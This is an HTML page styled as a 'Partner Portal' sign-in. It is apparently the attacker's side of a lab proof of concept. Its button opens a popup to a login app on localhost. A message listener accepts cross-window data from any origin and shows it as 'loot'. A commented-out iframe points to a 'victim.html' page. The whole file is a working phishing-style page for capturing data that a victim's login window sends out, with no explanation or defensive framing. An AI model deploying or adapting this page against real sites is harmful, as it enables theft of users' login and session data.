<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Partner Portal</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background: #f5f8fc;
        }

        .card {
            border: none;
            border-top: 4px solid #0d6efd;
        }

        h5 {
            color: #0d6efd;
        }

        .hidden {
            display: none;
        }
    </style>
</head>

<body>
    <div class="container py-5">
        <h5 class="mb-3">Please sign in to continue</h5>

        <button class="btn btn-primary mb-3" onclick="openPopup()">Sign In</button>

        <!-- <div class="card p-3 mb-3">
            <iframe src="victim.html" width="100%" height="260" style="border:0"></iframe>
        </div> -->

        <div class="card p-3 hidden">
            <h6 class="text-secondary">Received data</h6>
            <pre id="loot" class="mb-0"></pre>
        </div>
    </div>

    <script>
        let win = null;

        function openPopup() {
            win = window.open('http://127.0.0.1:5000', 'loginPopup', 'width=400,height=400');
        }

        window.addEventListener('message', (event) => {
            const el = document.getElementById('loot')
            el.textContent = 'Origin: ' + event.origin + '\nData: ' + JSON.stringify(event.data, null, 2);
            el.classList.toggle('hidden');

            win.close();
        });
    </script>
</body>

</html>
